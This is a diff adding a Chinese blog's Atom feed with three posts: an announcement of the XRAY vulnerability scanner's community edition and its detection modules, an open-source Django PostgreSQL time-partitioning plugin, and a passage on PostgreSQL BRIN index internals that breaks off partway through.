@@ -1,0 +1,1152 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.1">Jekyll</generator><link href="https://strcpy.me/feed/index.xml" rel="self" type="application/atom+xml" /><link href="https://strcpy.me/" rel="alternate" type="text/html" /><updated>2019-09-15T13:42:14+00:00</updated><id>https://strcpy.me/</id><title type="html">virusdefender’s blog (＾－＾)V</title><subtitle> 学而不思则罔，思而不学则殆</subtitle><author><name>virusdefender</name></author><entry><title type="html">XRAY 安全评估工具社区版</title><link href="https://strcpy.me/index.php/archives/795/" rel="alternate" type="text/html" title="XRAY 安全评估工具社区版" /><published>2019-07-18T00:00:01+00:00</published><updated>2019-07-18T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/XRAY%20%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E5%B7%A5%E5%85%B7%E7%A4%BE%E5%8C%BA%E7%89%88</id><content type="html" xml:base="https://strcpy.me/index.php/archives/795/">&lt;p&gt;最近几个月都在忙这个 XRAY 安全评估工具，直到有好心人提醒我本站的 ssl 证书过期了才想起来好久没写文章了。&lt;/p&gt;
+
+&lt;p&gt;在 2016 年的 7 月 7 号，长亭科技四周年的大好日子，我们发布了两款新产品，洞鉴 和 牧云。洞鉴 以资产管理、安全评估、漏洞管理为中心，来解决传统漏洞扫描产品不够贴近业务场景，很难做好安全闭环的问题；牧云 则是站在服务器的角度，为云平台提供更加强有力的安全支撑。这两款新产品的诞生填补了长亭在应用安全解决方案中的一大空缺。&lt;/p&gt;
+
+&lt;p&gt;在洞鉴发布后的一年里，我们收到了许多使用者的反馈，收获了不少客户的认可。与此同时，也在迭代的过程中，发现与总结出了许多问题和不足之处。也很多次有朋友联系到我们，咨询如何以个人的身份体验一次洞鉴的功能，但由于业务模式的缘故，我只能遗憾地拒绝了他们。&lt;/p&gt;
+
+&lt;p&gt;作为一家专心致志做技术、做产品的公司，我们抱着技术属于整个行业的态度，不愿意受到 ToB 商业模式的限制，非常愿意让更多的安全从业者使用我们的产品。在过去的几年中，我们开源了雷池的语义分析算法生成引擎，开源了牧云的核心技术，开源了许多我们内部的小工具，今天我们会以社区版工具的形式开放（非开源）洞鉴的核心能力，让更多的朋友和我们一起为更先进的漏洞扫描算法努力。&lt;/p&gt;
+
+&lt;p&gt;下载地址 &lt;a href=&quot;https://github.com/chaitin/xray&quot;&gt;https://github.com/chaitin/xray&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;文档 &lt;a href=&quot;http://chaitin.github.io/xray/&quot;&gt;http://chaitin.github.io/xray/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;目前支持的检测模块有&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SQL 注入检测 (key: sqldet)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;支持报错注入、布尔注入和时间盲注等&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;命令/代码注入检测 (key: cmd_injection)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;支持 shell 命令注入、PHP 代码执行、模板注入等&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;目录枚举 (key: dirscan)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;路径穿越检测 (key: path_traversal)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;支持常见平台和编码&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;XML 实体注入检测 (key: xxe)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;支持有回显和反连平台检测&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;poc 管理 (key: phantasm)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;默认内置部分常用的 poc，用户可以根据需要自行构建 poc 并运行。文档：https://chaitin.github.io/xray/#/guide/poc&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;文件上传检测 (key: upload)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;支持常见的后端语言&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;弱口令检测 (key: brute_force)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;社区版支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;jsonp 检测 (key: jsonp)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;检测包含敏感信息可以被跨域读取的 jsonp 接口&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ssrf 检测 (key: ssrf)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;ssrf 检测模块，支持常见的绕过技术和反连平台检测&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;基线检查 (key: baseline)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;检测低 SSL 版本、缺失的或错误添加的 http 头等&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;任意跳转检测 (key: redirect)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;支持 HTML meta 跳转、30x 跳转等&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CRLF 注入 (key: crlf_injection)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;检测 HTTP 头注入，支持 query、body 等位置的参数&lt;/p&gt;
+
+&lt;p&gt;当然商业版是支持更多的模块和 POC 的，如果有任何使用上的问题，可以查看文档上的反馈方式，和我们交流。&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="安全" /><summary type="html">最近几个月都在忙这个 XRAY 安全评估工具，直到有好心人提醒我本站的 ssl 证书过期了才想起来好久没写文章了。</summary></entry><entry><title type="html">开源了一个 Django PostgreSQL 时间分区表插件</title><link href="https://strcpy.me/index.php/archives/794/" rel="alternate" type="text/html" title="开源了一个 Django PostgreSQL 时间分区表插件" /><published>2019-02-09T00:00:01+00:00</published><updated>2019-02-09T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/%E5%BC%80%E6%BA%90%E4%BA%86%E4%B8%80%E4%B8%AA%20Django%20PostgreSQL%20%E6%97%B6%E9%97%B4%E5%88%86%E5%8C%BA%E8%A1%A8%E6%8F%92%E4%BB%B6</id><content type="html" xml:base="https://strcpy.me/index.php/archives/794/">&lt;h2 id=&quot;什么是分区表有什么优点&quot;&gt;什么是分区表，有什么优点&lt;/h2&gt;
+
+&lt;p&gt;分区表就是将逻辑上的一个大表分成一些物理上的小表，是数据库系统为大型表的数据组织和管理提供的一种实用的功能特性。&lt;/p&gt;
+
+&lt;p&gt;表分区有很多好处，比如：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;子表可以按照时间等特征去划分，如果一个查询带有时间范围，那么某些子表可以直接跳过。这样就减少了索引和数据文件的 IO 量，而且这些数据更可能被缓存在内存中了。&lt;/li&gt;
+  &lt;li&gt;一个子表可以被归档，也就是数据库会忽略它的存在，实现老数据不再查询的特性。&lt;/li&gt;
+  &lt;li&gt;如果磁盘空间不足，可以快速删除不想要的数据。被归档的表的删除和 vacuum 会比较容易，因为需要锁，一直写数据的情况下不容易操作。&lt;/li&gt;
+  &lt;li&gt;如果加一块磁盘扩容，之后创建的新的子表可以单独调整 tablespace 放在新的磁盘上，先不移动已有的数据。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;我们为什么要开发这个插件&quot;&gt;我们为什么要开发这个插件&lt;/h2&gt;
+
+&lt;p&gt;这里需要先插播一个广告&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;雷池（SafeLine）是全球首个基于智能语义分析算法的 WAF产品。雷池从计算机语言的角度进行攻击检测，区别于传统的基于特征库和黑白名单机制的拦截原理，极大地降低了误报率和漏报率，提升了 WAF 拦截的准确度。面对云端变化，雷池（SafeLine）云端解决方案无论应对私有云、公有云、混合云都有灵活应变的部署防护模式，帮助用户灵活配置网络环境。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;雷池需要不间断地将包括海量攻击检测、行为审计等各类日志入库持久化，给数据库带来了极大的压力。&lt;/p&gt;
+
+&lt;p&gt;当然表分区不是存储和处理大数据的最优办法，引入分布式数据库和分布式文件系统才能更好的分离查询和存储压力。但是在某些特定的场景下下面（比如你的产品是卖给客户一台硬件机器）是无法引入分布式系统的。&lt;/p&gt;
+
+&lt;p&gt;雷池的后端管理平台基于 Django 框架，而数据库主要使用 PostgreSQL。雷池 S20 系列使用的数据库主版本号为 11，该主版本更新的一大特性便是对表分区进行了若干增强，详情参见 https://www.postgresql.org/about/news/1894/ 。&lt;/p&gt;
+
+&lt;p&gt;由于 Django ORM 当前不支持声明分区表，所以在此之前也有如 architect (https://github.com/maxtepkeev/architect) 这样的 插件，但是它是基于表继承来实现的，并不支持 PostgreSQL 10 之后的原生分区表功能，而原生分区表功能在性能和易用性上都远远好于表继承。&lt;/p&gt;
+
+&lt;p&gt;所以我们开源了基于时间进行原生分区和管理的 Django 插件 django-pg-timepart (https://github.com/chaitin/django-pg-timepart)，它支持最新的 PostgreSQL 11，使 Django 能够在业务层对像文章、评论和日志这样的时序数据按一定时间间隔（如年、月、周等）来建立分区。&lt;/p&gt;
+
+&lt;h2 id=&quot;如何使用&quot;&gt;如何使用&lt;/h2&gt;
+
+&lt;p&gt;在 Django 中，数据的核心是 model，所以只要给 model 加上我们的 decorator 就可以在 migrate 的时候声明为分区表了。&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@TimeRangePartitioningSupport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;timestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_interval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AttackLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DateTimeField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rule_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TextField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;……&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;但是这个时候只有主表没有子表，需要再去扫描所有的 model 然后创建或者归档子表。&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partitioning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partitioning&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;detach_partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;雷池的分区自动创建和归档是通过后端的定时器来触发上面的 API 实现的。&lt;/p&gt;
+
+&lt;p&gt;当然我们的归档周期等配置也是可以调整的，而且归档历史和子表信息也可以查询，它们都在 PartitionConfig 和 PartitionLog 中。&lt;/p&gt;
+
+&lt;h2 id=&quot;最后&quot;&gt;最后&lt;/h2&gt;
+
+&lt;p&gt;django-pg-timepart 虽然是一个从我们实际业务中分离出来的，代码不过千行，功能单一的小插件，但是我们认为，当开源一个项目的同时，我们其实也在开源我们对于某些问题的一些想法，并愿意在开源社区中就我们使用 Django 构建 Web 应用时的所遇到的问题参与讨论，这才是我们的初衷。因此，我们欢迎大家为这一萌芽项目提供更多的建议、指出不足或对功能进行扩展使其更加通用化，Thanks！&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="后端" /><summary type="html">什么是分区表，有什么优点</summary></entry><entry><title type="html">PostgresSQL BRIN 索引的使用的那些坑</title><link href="https://strcpy.me/index.php/archives/793/" rel="alternate" type="text/html" title="PostgresSQL BRIN 索引的使用的那些坑" /><published>2019-02-04T00:00:01+00:00</published><updated>2019-02-04T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/PostgresSQL%20BRIN%20%E7%B4%A2%E5%BC%95%E7%9A%84%E4%BD%BF%E7%94%A8%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91</id><content type="html" xml:base="https://strcpy.me/index.php/archives/793/">&lt;p&gt;作者：@monouno，现实习于长亭科技。原文发表在 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/50167673&quot;&gt;https://zhuanlan.zhihu.com/p/50167673&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;BRIN 索引（块范围索引，Block Range Indexes）是 PostgreSQL 9.5 版本新增的索引类型。该索引维护每一定范围内数据块的最大最小值和其他一些统计数据，当数据库查询时可根据索引的统计信息筛选出不符合查询条件的数据块，以避免全表扫描，提高性能和减少 IO。和 BTree 索引比较所占用的空间足够小&lt;sup&gt;[1]&lt;/sup&gt;，因此 BRIN 索引一般用于线性相关较强字段的精确和范围查询，如在一张很大的日志表中通过 id 或时间查询。&lt;/p&gt;
+
+&lt;h2 id=&quot;创建测试数据&quot;&gt;创建测试数据&lt;/h2&gt;
+
+&lt;p&gt;创建数据表，只含有一个 id 字段&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;数据表大小为 &lt;code class=&quot;highlighter-rouge&quot;&gt;3.4G&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dt+ example
+                      List of relations
+ Schema |  Name   | Type  |  Owner   |  Size   | Description
+--------+---------+-------+----------+---------+-------------
+ public | example | table | safeline | 3457 MB |
+(1 row)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;创建索引&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INDEX&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pages_per_range&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;autosummarize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;索引大小为 &lt;code class=&quot;highlighter-rouge&quot;&gt;56K&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dti+ idx
+                        List of relations
+ Schema | Name | Type  |  Owner   |  Table  | Size  | Description
+--------+------+-------+----------+---------+-------+-------------
+ public | idx  | index | safeline | example | 56 kB |
+(1 row)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;explain 一下 BRIN 索引使用情况&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;EXPLAIN&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ANALYZE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;492167&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                                           QUERY PLAN
+--------------------------------------------------------------------------------------------------------------------------------
+ Gather  (cost=1016.26..807981.92 rows=1 width=4) (actual time=12.700..86.880 rows=1 loops=1)
+   Workers Planned: 2
+   Workers Launched: 2
+   -&amp;gt;  Parallel Bitmap Heap Scan on example  (cost=16.26..806981.82 rows=1 width=4) (actual time=56.477..80.759 rows=0 loops=3)
+         Recheck Cond: (id = 492167)
+         Rows Removed by Index Recheck: 77141
+         Heap Blocks: lossy=496
+         -&amp;gt;  Bitmap Index Scan on idx  (cost=0.00..16.26 rows=230946 width=0) (actual time=0.377..0.377 rows=10240 loops=1)
+               Index Cond: (id = 492167)
+ Planning Time: 0.318 ms
+ Execution Time: 86.950 ms
+(11 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;索引很小，尝试使用 B-Tree 索引，体积会是 &lt;code class=&quot;highlighter-rouge&quot;&gt;2.1G&lt;/code&gt;，大约是数据本身的三分之二大小了。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create index idx_btree on example (id);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dti+ idx_btree
+                            List of relations
+ Schema |   Name    | Type  |  Owner   |  Table  |  Size   | Description
+--------+-----------+-------+----------+---------+---------+-------------
+ public | idx_btree | index | safeline | example | 2142 MB |
+(1 row)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;brin-索引结构&quot;&gt;BRIN 索引结构&lt;/h2&gt;
+
+&lt;p&gt;BRIN 索引页的存储顺序依次是 &lt;code class=&quot;highlighter-rouge&quot;&gt;meta page&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;regular pages&lt;/code&gt;。我们通过 &lt;a href=&quot;https://www.postgresql.org/docs/current/pageinspect.html#id-1.11.7.31.6&quot;&gt;pageinspect&lt;/a&gt; 扩展可以很方便地分析 BRIN 索引的各个页。&lt;/p&gt;
+
+&lt;h3 id=&quot;meta-page&quot;&gt;meta page&lt;/h3&gt;
+
+&lt;p&gt;第一页 &lt;code class=&quot;highlighter-rouge&quot;&gt;meta page&lt;/code&gt; 保存 BRIN 索引的元数据&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from brin_metapage_info(get_raw_page('idx', 0));
+
+   magic    | version | pagesperrange | lastrevmappage
+------------+---------+---------------+----------------
+ 0xA8109CFA |       1 |          1024 |              1
+(1 row)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;lastrevmapage&lt;/code&gt; 表示 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt; 最后一页的下标，即从 &lt;code class=&quot;highlighter-rouge&quot;&gt;meta page&lt;/code&gt; 的下一页到 &lt;code class=&quot;highlighter-rouge&quot;&gt;lastrevmapage&lt;/code&gt; 都是 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;revmap-pages&quot;&gt;revmap pages&lt;/h3&gt;
+
+&lt;p&gt;接下来的 revmap 相当于一个目录，保存数据块到索引记录的映射关系，而且每一页 revmap 的记录数是固定的。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM brin_revmap_data(get_raw_page('idx', 1)) LIMIT 5;
+
+ pages
+-------
+ (2,1)
+ (2,2)
+ (2,3)
+ (2,4)
+ (2,5)
+(5 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/postgres/postgres/blob/master/src/backend/access/brin/brin_revmap.c&quot;&gt;下面的宏&lt;/a&gt;可以计算出一个数据块在 revmap 中的位置，然后可以在 revmap 中查询到索引的位置。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;#define HEAPBLK_TO_REVMAP_BLK(pagesPerRange, heapBlk) \
+	((heapBlk / pagesPerRange) / REVMAP_PAGE_MAXITEMS)
+#define HEAPBLK_TO_REVMAP_INDEX(pagesPerRange, heapBlk) \
+	((heapBlk / pagesPerRange) % REVMAP_PAGE_MAXITEMS)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以在扫描和更新索引时（比如 &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin.c#L188&quot;&gt;brininsert&lt;/a&gt; 等函数），可以简单的计算出一个数据块属于哪一条索引记录&lt;sup&gt;[2]&lt;/sup&gt;。&lt;/p&gt;
+
+&lt;p&gt;如果对应块索引还未被创建，那么该项就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;(0, 0)&lt;/code&gt;。随着表数据行和索引记录的不断增加，索引的 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt; 也会向后扩展，为了给这腾出位置，PostgreSQL 会从前面开始将 &lt;code class=&quot;highlighter-rouge&quot;&gt;regular pages&lt;/code&gt; 中的索引条目移到末尾，并更新和拓展 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;regular-page&quot;&gt;regular page&lt;/h3&gt;
+
+&lt;p&gt;可以通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;brin_page_items&lt;/code&gt; 查看索引记录&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM brin_page_items(get_raw_page('idx', 2), 'idx') LIMIT 5;
+
+ itemoffset | blknum | attnum | allnulls | hasnulls | placeholder |        value
+------------+--------+--------+----------+----------+-------------+---------------------
+          1 |      0 |      1 | f        | f        | f           | {1 .. 231424}
+          2 |   1024 |      1 | f        | f        | f           | {231425 .. 462848}
+          3 |   2048 |      1 | f        | f        | f           | {462849 .. 694272}
+          4 |   3072 |      1 | f        | f        | f           | {694273 .. 925696}
+          5 |   4096 |      1 | f        | f        | f           | {925697 .. 1157120}
+(5 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;blknum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;attnum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;allnulls&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;hasnulls&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;value&lt;/code&gt; 分别表示起始块数、字段下标、是否全为空值、是否存在空值和块范围内字段的最大最小值。这其中最重要的就是 value 这个字段了。PostgreSQL 就是根据这个 value 值来判断是否需要扫描这些数据块。以第三个条目为例，它的 &lt;code class=&quot;highlighter-rouge&quot;&gt;blknum&lt;/code&gt; 为 2048，说明是 2048 - 3072 数据块存储的数据范围是 &lt;code class=&quot;highlighter-rouge&quot;&gt;462849 .. 694272&lt;/code&gt;。如果我们查询的 SQL 是 &lt;code class=&quot;highlighter-rouge&quot;&gt;WHERE id = 492167&lt;/code&gt;，那在这些数据块中再搜索就足够了。&lt;/p&gt;
+
+&lt;p&gt;BRIN 索引的 &lt;code class=&quot;highlighter-rouge&quot;&gt;pages_per_range&lt;/code&gt; 可指定单条索引记录所统计的数据块范围，默认为 128。值越小统计的粒度就越小，索引的过滤性越好，但索引也会越大。由于每筛选一次字段 PostgreSQL 都要扫描全部的 BRIN 索引，所花费的时间也会变长，因此需要根据表的大小与应用场景去调整其值的大小。&lt;/p&gt;
+
+&lt;p&gt;当一些在索引条目边界的行被删除时，会使原有的索引条目失效，失效的索引条目需要重新统计。也可以通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;brin_desummarize_range&lt;/code&gt; 手动将一些索引条目失效。&lt;/p&gt;
+
+&lt;h2 id=&quot;我们遇到的问题&quot;&gt;我们遇到的问题&lt;/h2&gt;
+
+&lt;p&gt;我们有一张日志表需要不断插入大量请求日志，在用户浏览日志列表或是查看日志详情时需要进行等值或范围查询，起初在对 BRIN 索引进行测试时，先对日志表插入大量数据再建立索引进行查询，或是将之前归档的日志数据恢复再进行查询均有着不错的性能表现，但再进一步使用真实场景测试一段时间后发现日志查询变得非常慢，和之前的结果相差甚远。&lt;/p&gt;
+
+&lt;h3 id=&quot;只要数据插入足够快索引就跟不上我&quot;&gt;只要数据插入足够快，索引就跟不上我&lt;/h3&gt;
+
